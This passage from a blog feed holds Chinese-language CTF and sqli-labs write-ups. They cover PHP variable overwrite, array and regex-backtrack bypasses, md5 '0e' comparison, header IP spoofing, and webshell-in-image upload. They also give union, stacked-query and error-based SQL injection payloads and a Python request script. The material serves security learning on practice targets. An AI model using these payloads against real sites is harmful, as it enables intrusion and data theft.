class="line"></span><br><span class="line"></span><br><span class="line">flag In the variable ! </span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag1.php&quot;;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line">if(isset($_GET[&#x27;args&#x27;]))&#123;</span><br><span class="line">    $args = $_GET[&#x27;args&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/^\w+$/&quot;,$args))&#123;</span><br><span class="line">        die(&quot;args error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&quot;var_dump($$args);&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>附上源码<br>PHP自动化的全局变量：**$GLOBALS** —— 引用全局作用域中可用的全部变量，一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p><p>正则表达式”&#x2F;^\w+$&#x2F;“，匹配字符串，\w表示字符+数字+下划线{ a-z,A-Z,_,0-9 }。如果不匹配会输出 ‘’args error!‘’\</p><p>两个<code>/``/</code> 表明正则表达式的开始与结束，<code>^</code>开始字符，<code>$</code>结束字符，<code>+</code>代表可以有一个或多个<code>\w</code>。</p><p>PHP中变量可以当作另一个变量的变量名：$$args，结合第一句flag In the variable !</p><p>所以构造payload：URL?args&#x3D;GLOBALS</p><p>即可爆出所有args，其中包含flag。<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-75d20ffb204d8b27.png" alt="img"></p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><h4 id="【代码审计】之数组绕过"><a href="#【代码审计】之数组绕过" class="headerlink" title="【代码审计】之数组绕过"></a>【代码审计】之数组绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag3.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">areyouok</span>(<span class="params"><span class="variable">$greeting</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/Wpsec.*Good/is&#x27;</span>,<span class="variable">$greeting</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$greeting</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;greeting&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$greeting</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">areyouok</span>(<span class="variable">$greeting</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$greeting</span>,<span class="string">&#x27;Wpsec Good&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Wpsec Good. &#x27;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Do you know php?&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Do you really know PHP?&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>附上源码<br>PHP strpos() 函数:查找 “php” 在字符串中第一次出现的位置：<br><strong>eg:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strpos</span>(<span class="string">&quot;You love php, I love php too!&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要求post一个 greeting参数，经过areyouok函数正则过滤后如果返回false，<br>就进入下一个if，如果 greeting参数包含 Wpsec Good则打印flag。<br>可以利用strpos函数的一个漏洞，传入一个数组，会返回 NULL， NULL不强等于false，即可绕过。<br><strong>注：PHP函数中大部分无法处理数组</strong><br>构造payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">greeting= &amp;greeting[]=Wpsec Good</span><br></pre></td></tr></table></figure><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-1998b612d083aad8.png" alt="img"></p><h4 id="F12——网络——消息头"><a href="#F12——网络——消息头" class="headerlink" title="F12——网络——消息头"></a>F12——网络——消息头</h4><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><h4 id="【代码审计】之变量覆盖二"><a href="#【代码审计】之变量覆盖二" class="headerlink" title="【代码审计】之变量覆盖二"></a>【代码审计】之变量覆盖二</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">   <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">   <span class="variable">$_403</span> = <span class="string">&quot;Access Denied&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$_200</span> = <span class="string">&quot;Welcome Admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] != <span class="string">&quot;POST&quot;</span>)</span><br><span class="line">   &#123;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&quot;WPSEC-CTF is here :p...&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> ( !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>]) )</span><br><span class="line">   &#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="variable">$_403</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">   &#123;</span><br><span class="line">         <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">   &#123;</span><br><span class="line">         <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> ( <span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>] !== <span class="variable">$flag</span> )</span><br><span class="line">   &#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="variable">$_403</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;This is your flag : &quot;</span>. <span class="variable">$flag</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   <span class="keyword">die</span>(<span class="variable">$_200</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">WPSEC-CTF is here :p...</span><br></pre></td></tr></table></figure><p>附上源码<br>题目分析：</p><p>源码包含了flag.php文件，并且需要满足3个if 里的条件才能获取flag，题目中使用了两个foreach并且也使用了  <code>$$.</code>两个foreach中对<code>$$key</code>的处理是不一样的，满足条件后会将<code>$flag</code>里面的值打印出来，所以<code>$flag</code>是在flag.php文件文件中的。</p><p>但是由于<code>$flag</code>的值会被中间部分代码给覆盖掉，所以需要先将<code>$flag</code>的值赋给<code>$_200</code>或<code>$_403</code>变量，然后利用<code>die($_200)</code>或 die<code>($_403)</code>将flag打印出来。</p><p>两个foreach函数遍历数组函数，这里就是把我们用get方法传输的数据当做数组进行遍历，并将遍历的参数赋值给key，将参数值复制给value。<br>还有一个if判断语句，判断用post方法传输的数据是不是和<code>$flag</code>的值相同，如果相同，输出flag。<br>最后输出<code>$200</code>的内容。</p><p>解题方法：</p><p>由于第7，11-14行间的代码会将<code>$flag</code>的值给覆盖掉，所以只能利用第一个foreach先将<code>$flag</code>的值赋给<code>$_200</code>，然后利用<code>die($_200)</code>将原本的flag值打印出来。</p><p>最终PAYLOAD：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET DATA：?_200=flag </span><br><span class="line"></span><br><span class="line">POST DATA：flag=1</span><br></pre></td></tr></table></figure><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><h4 id="IP伪造-密码学"><a href="#IP伪造-密码学" class="headerlink" title="IP伪造+密码学"></a>IP伪造+密码学</h4><p>IP伪造的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For</span><br><span class="line">Client-IP</span><br><span class="line">x-remote-IP</span><br><span class="line">x-originating-IP</span><br><span class="line">x-remote-addr</span><br></pre></td></tr></table></figure><p>解题：<br>用burp进行抓包，前提是先输入账户密码，一般我们使用账户admin,密码随意，抓包后进行ip伪造，<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-1669dcf5fcef0c4a.png" alt="img"></p><h4 id="注意这里的IP为题目上提到的，并不是本地的"><a href="#注意这里的IP为题目上提到的，并不是本地的" class="headerlink" title="注意这里的IP为题目上提到的，并不是本地的"></a>注意这里的IP为题目上提到的，并不是本地的</h4><p>之后，send to repeater,运行后发现，<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-3108c4097067f30f.png" alt="img"><br>rot13这里用到密码学，解码后发现，jcfrp&#x3D;wpsec，很显然，这就是密码，不难想到，只有账户和密码同时正确，并且ip伪造成功，才能得到我们的flag，故输入admin,wpsec，后抓包，ip伪造，得到<strong>FLAG</strong><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-27043b0525cb0d03.png" alt="img"></p><h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p>文件上传，这里需要提到<a href="https://l0ki.top/archives/88/">如何在图片中插入一句话木马</a><br>上传时借助抓包工具，<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-807e5a7dd615b804.png" alt="img"><br>这里我们需要修改**“2.jpg”为”2.php”**方可绕过，拿到flag,<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-2e23303ea2bbae51.png" alt="img"></p><h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><h4 id="sql注入之宽字节注入"><a href="#sql注入之宽字节注入" class="headerlink" title="sql注入之宽字节注入"></a>sql注入之宽字节注入</h4><p>这里我们需要用到%df’,类似于sql-lab-less32吧，<br>尝试注入<code>?id=0%df&#39; union select 1,1,1--+</code></p><h4 id="注意这里过滤了-注释，故我们可以使用其他的注释"><a href="#注意这里过滤了-注释，故我们可以使用其他的注释" class="headerlink" title="注意这里过滤了#注释，故我们可以使用其他的注释"></a>注意这里过滤了#注释，故我们可以使用其他的注释</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-5ccdcb4972a486c5.png" alt="img"></p><p>接下来就直接放payload:<br>爆库:<br><code>?id=0%df&#39; union select 1,1,database()--+</code><br>爆表:<br><code>?id=0%df&#39; union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=database()--+</code><br>爆值:<br><code>?id=0%df&#39; union select 1,1,group_concat(flag) from test.flag--+</code><br><strong>注意：这里由于限制了 ‘ 我们无法用常用的语句，如 “table_name&#x3D;’flag’，这样无法绕过</strong><br>最终拿到<strong>FLAG</strong></p><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;flag2.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">  <span class="variable">$flag</span> = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$gift</span>)) </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$flag</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$gift</span> == <span class="variable">$content</span>) </span><br><span class="line">    &#123;</span><br><span class="line">     </span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">       &#123;<span class="variable">$a</span> = <span class="string">&#x27;huahuishishabi&#x27;</span>;</span><br><span class="line">        @<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span>[<span class="number">0</span>] != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>[<span class="number">0</span>]) == <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>)) </span><br><span class="line">        &#123;</span><br><span class="line">                 <span class="keyword">echo</span> <span class="variable">$theflag</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">          <span class="keyword">exit</span>(<span class="string">&#x27;oh...no..&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&#x27;oh..no.no..&#x27;</span>; </span><br><span class="line">        &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; </span><br><span class="line">       <span class="keyword">else</span> </span><br><span class="line">      &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;Oh..&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Oh..</span><br></pre></td></tr></table></figure><p>附上源码<br>PHP trim() 函数：移除字符串两侧的空白字符或其他预定义字符。<br>PHP extract() 函数：从数组中将变量导入到当前的符号表。<br>PHP parse_str() 函数:把查询字符串解析到变量中。<br>题目分析：<br>第一个if GET传flag 和 gift 的值，如果弱类型相等即可执行结下了的语句<br>第二个if POST传id,如果id的值等于a[0]，a[0]的值等于md5加密后与QNKCDZO加密后一样，即都为0e开头的即可<br>整理一下思路：首先要求使用GET提交flag和gift参数，其次用POST提交id参数，然后<code>parse_str($id)</code>对id参数的数据进行处理，再使用判断<code>$a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)</code>的结果是否为真，为真就返回flag，md5(‘QNKCDZO’)的结果是0e830400451993494058024219903391由于此次要满足<code>$a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)</code>所以要利用php弱语言特性，0e123会被当做科学计数法，0 * 10 x 123。所以需要找到一个字符串md5后的结果是0e开头后面都是数字的，如，240610708，s878926199a</p><h5 id="这里用到PHP处理0e开头md5哈希字符串缺陷-bug"><a href="#这里用到PHP处理0e开头md5哈希字符串缺陷-bug" class="headerlink" title="这里用到PHP处理0e开头md5哈希字符串缺陷&#x2F;bug"></a>这里用到<a href="http://www.cnblogs.com/Primzahl/p/6018158.html">PHP处理0e开头md5哈希字符串缺陷&#x2F;bug</a></h5><p>解题过程：<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-a4f16b76fde8717c.png" alt="img"></p><h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag4.php&quot;;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line">function areyouok($greeting)&#123;</span><br><span class="line">    return preg_match(&#x27;/Wpsec.*Good/is&#x27;,$greeting);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$greeting=@$_POST[&#x27;greeting&#x27;];</span><br><span class="line">if(!is_array($greeting))&#123;</span><br><span class="line">    if(!areyouok($greeting))&#123;</span><br><span class="line">        if(strpos($greeting,&#x27;Wpsec Good&#x27;)!==false)&#123;</span><br><span class="line">            echo &#x27;Wpsec Good. &#x27;.$flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#x27;Do you know php?&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;Do you really know PHP?&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">Do you know php?</span><br></pre></td></tr></table></figure><p>附上源码<br>题目分析：<br>这道题与前面的一道题类似<br>但是加上了is_array的判断，不允许使用数组来绕过。<br>所以那道题的思路不能再用了。 这里需要用到正则回溯，可以参考大牛的文章：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a><br>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限 pcre.backtrack_limit，默认为100万。当正则回溯超过这个上限时，就会返回false。<br>因此我们只要post100万个字符，让它回溯大于100万次，函数就会返回false，从而绕过if判断。<br>解题思路：<br>这里我直接上传了脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">data = &#123;&quot;greeting&quot;:&quot;Wpsec Good&quot; + &quot;aaaaa&quot; * 1000000&#125;</span><br><span class="line">res = requests.post(&#x27;http://47.93.6.132:5002/phpgood2.php&#x27;, data=data)</span><br><span class="line">print (res.content)</span><br></pre></td></tr></table></figure><p>结果<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-91f8161963307e05.png" alt="img"></p><p>当然还有另一种解题思路，但是比较麻烦<br>直接POST <code>greeting=Wpsec Good (后面省略一百万个字符）</code></p><h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p>这道300分的题一看就不简单，题目名字sqlsql，故推断需要进行两次注入<br>第一次注入，其实和sql-lab-less24题很像。<br>解题思路：<br>我们先利用注册，进行注册<code>username:admin&#39;#,password:123</code><br>接着根据经验，这时候修改密码，修改后的密码便是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username:admin的密码</span><br></pre></td></tr></table></figure><p>登陆后，发现后台提示table:flag,tolumn:flag，不难想到，表名，列名，但是用这个信息注入还不行，<br>因为delete过滤了太多<br>这道题的过滤点 union where or 对我们构成必要的sql语句造成了不便，这时候我们可以用&#x2F;**&#x2F;<br>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">un/**/ion </span><br><span class="line">whe/**/re </span><br><span class="line">o/**/r</span><br></pre></td></tr></table></figure><p>但是由于只是储备有限，最终未能拿到flag，不过据说需要用脚本跑。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How to Insert a Sentence into a Picture in Win10</title>
      <link href="/2019/02/27/How-to-Insert-a-Sentence-into-a-Picture-in-Win10/"/>
      <url>/2019/02/27/How-to-Insert-a-Sentence-into-a-Picture-in-Win10/</url>
      
        <content type="html"><![CDATA[<p>首先我们准备一张像素比较小的图片，命名为11.jpg<br>然后新建一个txt文件，更改名称为1.txt，输入代码。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-963c4197e06e4440.png" alt="img"></p><p>使用windos + r键弹出windows运行框输入cmd调出命令提示框。<br>执行命令copy 11.jpg&#x2F;b + 1.txt&#x2F;a 2.jpg 前两个文件合并成一个文件，文件属性为2.jpg。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-967b195f90176640.png" alt="img"></p><p>找到2.jpg更改扩展名为2.txt，查看代码</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-3022e3a17eab324f.png" alt="img"></p><p>插入成功！</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sql Lab(41-65)</title>
      <link href="/2019/02/26/sql-lab(41-65)/"/>
      <url>/2019/02/26/sql-lab(41-65)/</url>
      
        <content type="html"><![CDATA[<h2 id="less-41"><a href="#less-41" class="headerlink" title="less-41"></a>less-41</h2><p>只有输入id&#x3D;1才会出现回显，尝试输入 ?id&#x3D;0 union select 1,1,1 成功回显</p><h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0 union select 1,1,database()</span><br></pre></td></tr></table></figure><h3 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0 union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br></pre></td></tr></table></figure><h3 id="爆列"><a href="#爆列" class="headerlink" title="爆列"></a>爆列</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0 union select 1,1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure><h3 id="爆值"><a href="#爆值" class="headerlink" title="爆值"></a>爆值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0 union select 1,1,group_concat(username,password) from users</span><br></pre></td></tr></table></figure><h2 id="less-42"><a href="#less-42" class="headerlink" title="less-42"></a>less-42</h2><p>查看源码:<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-fe01f119370ecf88.png" alt="图片.png"><br>Password变量在post过程中，没有通过mysql_real_escape_string()函数的处理。<br>用户名可以随意填写，<br>密码我们可以构造进行注入。</p><h3 id="通过伪造表查看数据列名"><a href="#通过伪造表查看数据列名" class="headerlink" title="通过伪造表查看数据列名"></a>通过伪造表查看数据列名</h3><p>在密码栏填写:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;;creat table less42 like users#</span><br></pre></td></tr></table></figure><p>创建成功后发现，users表中数据列名为<code>id,username,password</code><br>以此类推，只需插入数据(或者更新数据)即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;;insert into users (username,password) values (&#x27;a&#x27;,&#x27;a&#x27;)#</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-010e54fb430d2601.png" alt="图片.png"></p><h2 id="less-43"><a href="#less-43" class="headerlink" title="less-43"></a>less-43</h2><p>先用同样的方法测试，就用less42的方法，<br>注入语句：a’;creat table less43 like users#<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-15f4100376a90b34.png" alt="图片.png"></p><p>发现报错<br>根据报错提示，只需在less-42的基础上加一个括号，即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;);creat table less43 like users#</span><br></pre></td></tr></table></figure><p>以此类推，同less-42</p><h2 id="less-44"><a href="#less-44" class="headerlink" title="less-44"></a>less-44</h2><p>同less-42,只不过没有报错回显，我们只能通过查看数据库来判断是否注入成功<br>通过测试，发现和less42一样。</p><h2 id="less-45"><a href="#less-45" class="headerlink" title="less-45"></a>less-45</h2><p>集结了less-44和less-43，即报错不回显，测试方法同less-44,盲注，观察数据库，注入方法和less-43一样。</p><h2 id="less-46"><a href="#less-46" class="headerlink" title="less-46"></a>less-46</h2><p><a href="http://www.cnblogs.com/lcamry/p/5762710.html">借鉴于博客</a><br>尝试?sort&#x3D;1 desc或者asc，显示结果不同，则表明可以注入。<br>爆表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-46/index.php?sort=extractvalue(1,concat(0x7e,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())))%20--+</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-39e7ced625b92482.png" alt="图片.png"></p><p>爆列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-46/index.php?sort=extractvalue(1,concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)))--+</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-e7bd63756f760f55.png" alt="图片.png"></p><p>爆值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 